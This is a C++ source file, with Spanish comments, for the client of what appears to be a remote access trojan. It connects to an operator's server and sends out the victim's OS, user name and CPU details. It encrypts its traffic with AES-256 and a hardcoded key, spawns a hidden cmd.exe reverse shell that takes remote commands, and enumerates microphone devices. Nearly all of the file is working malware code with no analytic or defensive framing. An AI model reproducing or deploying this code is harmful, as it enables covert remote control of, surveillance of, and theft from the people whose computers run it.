#include "cliente.hpp"
#include "mod_mic.hpp"
#include "misc.hpp"


void Cliente::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }

}

Cliente::Cliente() {
    this->Init_Key();
}

Cliente::~Cliente() {
	this->CerrarConexion();
    if (this->reverseSHELL != nullptr) {
        this->reverseSHELL->TerminarShell();
        delete this->reverseSHELL;
        this->reverseSHELL = nullptr;
    }
    if (this->mod_Mic != nullptr){
        delete this->mod_Mic;
        this->mod_Mic = nullptr;
    }
}

void Cliente::CerrarConexion() {
    if (this->sckSocket != INVALID_SOCKET) {
		closesocket(this->sckSocket);
		this->sckSocket = INVALID_SOCKET;
	}
}

bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
	struct addrinfo sAddress, *sP, *sServer;
	memset(&sAddress, 0, sizeof(sAddress));

	sAddress.ai_family = AF_UNSPEC;
	sAddress.ai_socktype = SOCK_STREAM;

	int iRes = getaddrinfo(cIP, cPuerto, &sAddress, &sServer);
	if (iRes != 0) {
		error();
		return false;
	}

	for (sP = sServer; sP != nullptr; sP = sP->ai_next) {
		if ((this->sckSocket = socket(sP->ai_family, sP->ai_socktype, sP->ai_protocol)) == INVALID_SOCKET) {
			//socket error
			continue;
		}

		if (connect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
			//No se pudo conectar
			error();
			continue;
		}
		//exito
		break;
	}

	if (sP == nullptr || this->sckSocket == INVALID_SOCKET) {
        freeaddrinfo(sServer);
        return false;
	}

    freeaddrinfo(sServer);
    
	return true;
}

void Cliente::MainLoop() {
    //Esperar por comandos
    char cBuffer[1024];
    memset(&cBuffer, 0, sizeof(cBuffer));
    while (this->isRunning) {
        //Limpiar el buffer
        if (cBuffer[0] != 0) {
            memset(&cBuffer, 0, sizeof(cBuffer));
        }

        //Espere el comando en modo block
#ifdef ___DEBUG_
        std::cout<<"Esperando comando\n";
#endif
        int iRecibido = this->cRecv(this->sckSocket, cBuffer, 1024, false);

        if (iRecibido <= 0 && GetLastError() != WSAEWOULDBLOCK) {
            //No se pudo recibir nada
            break;
        }
#ifdef ___DEBUG_
        std::cout << "[SERVIDOR] " << cBuffer << "\n";
#endif
        //Partir maximo 50 parametros
        this->ProcesarComando(strSplit(cBuffer, '~', 50));

    }
}

void Cliente::ProcesarComando(std::vector<std::string> strIn) {
    if (strIn.size() == 0) {
        //No hay comandos
        return;
    }
    int iEnviado = 0;
    
    if(this->Comandos[strIn[0].c_str()] == EnumComandos::PING) {
#ifdef ___DEBUG_
        std::cout << "Ping\n";
#endif
        std::string strComand = std::to_string(EnumComandos::PONG);
        strComand.append(1, '\\');
        iEnviado = this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false);
    }

    if (strIn[0] == "CUSTOM_TEST") {
        std::string strTest = "03\\";
        strTest += RandomID(7);
        iEnviado = this->cSend(this->sckSocket, strTest.c_str(), strTest.size(), 0, false);
    }

    //Lista de dispositivos de entrada (mic)
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Refre_Dispositivos) {
        if (this->mod_Mic != nullptr) {
            delete this->mod_Mic;
            this->mod_Mic = nullptr;
        }
        
        this->mod_Mic = new Mod_Mic(this);
        this->mod_Mic->sckSocket = this->sckSocket;
        this->mod_Mic->Enviar_Dispositivos();

        delete this->mod_Mic;
        this->mod_Mic = nullptr;

    }

    //Iniciar shell
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Reverse_Shell_Start) {
        if (this->reverseSHELL != nullptr) {
            this->reverseSHELL->TerminarShell();
            delete this->reverseSHELL;
            this->reverseSHELL = nullptr;
        }
        this->reverseSHELL = new ReverseShell(this);
        this->reverseSHELL->sckSocket = this->sckSocket;
        this->reverseSHELL->SpawnShell("C:\\Windows\\System32\\cmd.exe");        
    }

    //Escribir comando a la shell
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Reverse_Shell_Command) {
        if (this->reverseSHELL) {
            std::string strJoined = "";
            for (int i = 1; i < int(strIn.size()); i++) {
                strJoined += strIn[i] + "~";
            }
            strJoined = strJoined.substr(0, strJoined.size() - 1);

            this->reverseSHELL->thEscribirShell(strJoined);

            if (strJoined == "exit\r\n") {
                if (this->reverseSHELL) {
                    this->reverseSHELL->TerminarShell();
                    delete this->reverseSHELL;
                    this->reverseSHELL = nullptr;
                }
#ifdef ___DEBUG_
                std::cout << "Shell eliminada :v\n";
#endif
            }
        }
    }

#ifdef ___DEBUG_
    std::cout << "Enviados "<<iEnviado<<" bytes\n";
#endif
}


void Cliente::iniPacket() {
    //Enviar SO
    std::string strOut = "01\\";
    strOut += strOS();
    strOut.append(1, '\\');
    strOut += strUserName();
    strOut.append(1, '\\');
    strOut += strCpu();
    
    int iB = cSend(this->sckSocket, strOut.c_str(), strOut.length(), 0, false);
#ifdef ___DEBUG_
    std::cout << "Enviados " << iB << " bytes - "<< strOut <<"\n";
#endif
}

int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock) {
    
    // 1 non block
    // 0 block
    
    ByteArray cData = this->bEnc((const unsigned char*)pBuffer, pLen);
    std::string strPaqueteFinal = "";
    for (auto c : cData) {
        strPaqueteFinal.append(1, c);
    }
    
    if (isBlock) {
#ifdef ___DEBUG_
        std::cout << "[BLOCK-MODE] send" << strPaqueteFinal.size() << " bytes\n";
#endif
        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
#ifdef ___DEBUG_
            std::cout << "No se pudo hacer block\n";
            error();
#endif
        }
        int iEnviado = send(pSocket, strPaqueteFinal.c_str(), cData.size(), pFlags);

        //Restaurar
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
#ifdef ___DEBUG_
            error();
#endif
        }

        return iEnviado;
    }
    else {
        return send(pSocket, strPaqueteFinal.c_str(), cData.size(), pFlags);
    }
}

int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock) {
    //Aqui el socket por defecto es block asi que si se pasa false es normal
    // 1 non block
    // 0 block
    char* cTmpBuff = new char[pLen];
    ZeroMemory(cTmpBuff, pLen);

    int iRecibido = 0;
    if (isBlock) {
        std::cout << "[BLOCK-MODE] recv " << std::endl;
        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
#ifdef ___DEBUG_
            std::cout << "No se pudo hacer block\n";
            error();
#endif
        }
        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        std::cout << "Recibidos " << iRecibido << " bytes\n";
        if (iRecibido <= 0) {
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return -1;
        }
        //Decrypt

        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        std::string strOut = "";
        iRecibido = 0;
        for (auto c : bOut) {
            strOut.append(1, c);
            iRecibido++;
        }
        memccpy(pBuffer, strOut.c_str(), '\0', 1024);

        //Restaurar
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
#ifdef ___DEBUG_
            error();
#endif
        }
        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }
    else {

        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        std::cout << "Recibidos " << iRecibido << " bytes\n";
        if (iRecibido <= 0) {
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return -1;
        }
        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        std::string strOut = "";
        iRecibido = 0;
        for (auto c : bOut) {
            strOut.append(1, c);
            iRecibido++;
        }
        memccpy(pBuffer, strOut.c_str(), '\0', 1024);

        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }
}

//AES256
ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
    this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        std::cout << "Error encriptando " << pInput << "\n";
    }
    return bOutput;
}

ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
    this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        std::cout << "Error desencriptando " << pInput << "\n";
    }
    return bOutput;
}

//Reverse shell

bool ReverseShell::SpawnShell(const char* pstrComando) {
#ifdef ___DEBUG_
    std::cout << "Lanzando " << pstrComando << "\n";
#endif
    
    this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = nullptr;
    sa.bInheritHandle = true;
    if (!CreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !CreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
#ifdef ___DEBUG_
        std::cout << "Error creando tuberias\n";
        error();
#endif
        return false;
    }
    STARTUPINFO si;
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = this->stdoutWr;
    si.hStdError = this->stdoutWr;
    si.hStdInput = this->stdinRd;

    if (CreateProcess(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
#ifdef ___DEBUG_
        std::cout << "No se pudo spawnear la shell\n";
        error();
#endif
        return false;
    }
    
    //La shell esta corriendo
    this->isRunning = true;
    if (this->copy_ptr != nullptr) {
        this->copy_ptr->cSend(this->sckSocket, "04\\Corriendo...", 16, 0, false);
    }
    
    this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
    
    return true;
}

void ReverseShell::TerminarShell() {
    
    std::unique_lock<std::mutex> lock(this->mutex_shell);
    this->isRunning = false;
    lock.unlock();

    if (this->tRead.joinable()) {
        this->tRead.join();
    }

    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Finish);
    strComando += "\\Done...";
    this->copy_ptr->cSend(this->sckSocket, strComando.c_str(), strComando.size()+1, 0, false);

    TerminateProcess(this->pi.hProcess, 0);
    if (this->stdinRd != nullptr) {
        CloseHandle(this->stdinRd);
        this->stdinRd = nullptr;
    }
    if (this->stdinWr != nullptr) {
        CloseHandle(this->stdinWr);
        this->stdinWr = nullptr;
    }
    if (this->stdoutRd != nullptr) {
        CloseHandle(this->stdoutRd);
        this->stdoutRd = nullptr;
    }
    if (this->stdoutWr != nullptr) {
        CloseHandle(this->stdoutWr);
        this->stdoutWr = nullptr;
    }
}

void ReverseShell::thLeerShell(HANDLE hPipe) {
    //int iLen = 0; , iRet = 0;
    char cBuffer[256], cBuffer2[256 * 2 + 30];
    DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
    BYTE bPChar = 0;
    while (this->isRunning) {
        if (PeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
            if (dBytesReaded > 0) {
                ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
            }else {
                Sleep(100);
                continue;
            }
            for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
                if (cBuffer[dBufferC] == '\n' && bPChar != '\r') {
                    cBuffer2[dBytesToWrite++] = '\r';
                }
                bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
            }
            cBuffer2[dBytesToWrite] = '\0';

            std::string strOut = std::to_string(EnumComandos::Reverse_Shell_Salida);
            strOut.append(1, '\\');
            strOut += cBuffer2;

            int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
            Sleep(10);
            if (iEnviado <= 0) {
                //Desconectado o se perdio la conexion
                std::unique_lock<std::mutex> lock(this->mutex_shell);
                this->isRunning = false;
                lock.unlock();
                break;
            }

        }else {
            //error peeknamedpipe
            std::unique_lock<std::mutex> lock(this->mutex_shell);
            this->isRunning = false;
            lock.unlock();
            break;
        }
    }
#ifdef ___DEBUG_
    std::cout<<"[!]thLeerShell finalizada"<<std::endl;
    error();
#endif
}

void ReverseShell::thEscribirShell(std::string pStrInput) {
    if (pStrInput == "exit\r\n") {
        std::unique_lock<std::mutex> lock(this->mutex_shell);
        this->isRunning = false;
        lock.unlock();
    }

    DWORD dBytesWrited = 0;
    //stdinWr tuberia de entrada
    if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
#ifdef ___DEBUG_
        std::cout << "Error escribiendo a la tuberia\n-DATA: " << pStrInput << std::endl;
        error();
#endif
        std::unique_lock<std::mutex> lock(this->mutex_shell);
        this->isRunning = false;
        lock.unlock();
    }
}

//Mod_Mic

void Mod_Mic::Enviar_Dispositivos() {
    std::vector<std::string> vc_devices = this->ObtenerDispositivos();
    std::string strSalida = "";
    
    if (vc_devices.size() > 0) {
        strSalida = std::to_string(EnumComandos::Mic_Refre_Resultado);
        strSalida.append(1, '\\');
        for (auto strDevice : vc_devices) {
            strSalida += strDevice;
            strSalida.append(1, '\\');
        }
        strSalida = strSalida.substr(0, strSalida.size() - 1);
        this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
    }else {
        strSalida = "No hay dispositivos";
    }

    this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
}